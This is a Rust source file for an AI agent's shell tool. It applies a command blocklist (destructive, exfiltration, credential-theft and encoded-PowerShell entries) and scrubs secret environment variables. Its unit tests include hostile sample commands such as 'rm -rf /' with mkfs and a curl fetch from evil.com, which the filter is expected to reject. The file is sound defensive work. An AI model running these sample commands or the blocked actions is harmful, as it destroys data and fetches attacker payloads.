use crate::dispatcher::{PermissionLevel, ToolError, ToolSpec};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::path::Path;

pub fn tool_specs() -> Vec<ToolSpec> {
    vec![ToolSpec {
        name: "bash".to_string(),
        description: "Run a shell command. Use PowerShell on Windows, bash on Unix.".to_string(),
        input_schema: json!({
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Shell command to execute"},
                "timeout_ms": {"type": "integer", "description": "Timeout in milliseconds (default: 30000)"}
            },
            "required": ["command"]
        }),
        required_permission: PermissionLevel::FullAccess,
    }]
}

/// Commands that are always blocked regardless of permission level.
const BLOCKED_COMMANDS: &[&str] = &[
    // System-destructive
    "mkfs",
    "dd if=",
    "format c:",
    "format d:",
    // Network exfiltration
    "curl",
    "wget",
    "invoke-webrequest",
    "invoke-restmethod",
    "net use",
    "scp ",
    "rsync",
    "ftp ",
    // Process/service manipulation
    "shutdown",
    "restart-computer",
    "stop-computer",
    "stop-service",
    "sc delete",
    "taskkill /f /im",
    // Registry/system config
    "reg delete",
    "regedit",
    "bcdedit",
    // Credential access
    "mimikatz",
    "cmdkey",
    "rundll32",
    "certutil -urlcache",
    // Execution policy bypass
    "set-executionpolicy",
    "-executionpolicy bypass",
    "powershell -enc",
    "powershell -encodedcommand",
    // Container/VM escape
    "docker run",
    "docker exec",
];

/// Commands that require extra scrutiny (logged as warnings but allowed).
const WARN_COMMANDS: &[&str] = &[
    "pip install",
    "npm install",
    "cargo install",
    "chmod",
    "chown",
    "icacls",
    "attrib",
    "netsh",
];

/// Environment variables to scrub from subprocess environment.
const SCRUBBED_ENV_VARS: &[&str] = &[
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "AZURE_CLIENT_SECRET",
    "GH_TOKEN",
    "GITHUB_TOKEN",
    "GITLAB_TOKEN",
    "HF_TOKEN",
    "HUGGING_FACE_HUB_TOKEN",
    "WANDB_API_KEY",
    "COMET_API_KEY",
    "NEPTUNE_API_TOKEN",
    "DATABASE_URL",
    "DB_PASSWORD",
    "SECRET_KEY",
    "PRIVATE_KEY",
];

/// Check if a command is blocked by the safety filter.
fn check_command_safety(command: &str) -> Result<(), ToolError> {
    let lower = command.to_lowercase();

    for blocked in BLOCKED_COMMANDS {
        if lower.contains(blocked) {
            return Err(ToolError::Execution(format!(
                "command blocked by safety filter: contains '{blocked}'"
            )));
        }
    }

    for warn_cmd in WARN_COMMANDS {
        if lower.contains(warn_cmd) {
            tracing::warn!("bash command uses sensitive operation: {warn_cmd}");
        }
    }

    Ok(())
}

/// Build a filtered environment map that scrubs sensitive variables.
fn build_safe_env() -> HashMap<String, String> {
    let mut env: HashMap<String, String> = std::env::vars().collect();
    for key in SCRUBBED_ENV_VARS {
        env.remove(*key);
    }
    // Also scrub any variable whose name contains KEY, SECRET, TOKEN, PASSWORD
    let sensitive_patterns = ["_KEY", "_SECRET", "_TOKEN", "_PASSWORD", "_CREDENTIAL"];
    let keys_to_remove: Vec<String> = env
        .keys()
        .filter(|k| {
            let upper = k.to_uppercase();
            sensitive_patterns.iter().any(|p| upper.contains(p))
        })
        .cloned()
        .collect();
    for key in keys_to_remove {
        env.remove(&key);
    }
    env
}

pub async fn run_bash(input: &Value, workspace: &Path) -> Result<String, ToolError> {
    let command = input["command"]
        .as_str()
        .ok_or_else(|| ToolError::InvalidInput("command is required".to_string()))?;
    let timeout_ms = input["timeout_ms"].as_u64().unwrap_or(30_000);

    // Safety: check command against blocklist
    check_command_safety(command)?;

    let (shell, flag) = if cfg!(windows) {
        ("powershell", "-Command")
    } else {
        ("bash", "-c")
    };

    // Build a filtered environment without sensitive credentials
    let safe_env = build_safe_env();

    let result = tokio::time::timeout(
        std::time::Duration::from_millis(timeout_ms),
        tokio::process::Command::new(shell)
            .arg(flag)
            .arg(command)
            .current_dir(workspace)
            .env_clear()
            .envs(&safe_env)
            .output(),
    )
    .await
    .map_err(|_| ToolError::Execution(format!("command timed out after {timeout_ms}ms")))?
    .map_err(|e| ToolError::Execution(format!("failed to spawn: {e}")))?;

    let stdout = String::from_utf8_lossy(&result.stdout);
    let stderr = String::from_utf8_lossy(&result.stderr);

    let mut output = String::new();
    if !stdout.is_empty() {
        output.push_str(&stdout);
    }
    if !stderr.is_empty() {
        if !output.is_empty() {
            output.push('\n');
        }
        output.push_str("STDERR:\n");
        output.push_str(&stderr);
    }

    if !result.status.success() {
        output.push_str(&format!(
            "\nExit code: {}",
            result.status.code().unwrap_or(-1)
        ));
    }

    // Truncate very long output
    if output.len() > 60_000 {
        output.truncate(60_000);
        output.push_str("\n... (truncated)");
    }

    Ok(output)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocks_destructive_commands() {
        assert!(check_command_safety("rm -rf / && mkfs.ext4 /dev/sda").is_err());
        assert!(check_command_safety("curl https://evil.com/payload").is_err());
        assert!(check_command_safety("Invoke-WebRequest https://evil.com").is_err());
        assert!(check_command_safety("shutdown /s /t 0").is_err());
    }

    #[test]
    fn allows_safe_commands() {
        assert!(check_command_safety("ls -la").is_ok());
        assert!(check_command_safety("python train.py --epochs 50").is_ok());
        assert!(check_command_safety("cargo test").is_ok());
        assert!(check_command_safety("Get-ChildItem").is_ok());
    }

    #[test]
    fn env_scrubbing_removes_api_keys() {
        // Set a test key
        std::env::set_var("ANTHROPIC_API_KEY", "test-key-123");
        let env = build_safe_env();
        assert!(!env.contains_key("ANTHROPIC_API_KEY"));
        std::env::remove_var("ANTHROPIC_API_KEY");
    }

    #[test]
    fn env_scrubbing_removes_pattern_matches() {
        std::env::set_var("MY_CUSTOM_SECRET_VALUE", "hidden");
        let env = build_safe_env();
        // Should be removed because it contains _SECRET
        // (env var names are checked case-insensitively via to_uppercase)
        assert!(!env.contains_key("MY_CUSTOM_SECRET_VALUE"));
        std::env::remove_var("MY_CUSTOM_SECRET_VALUE");
    }
}
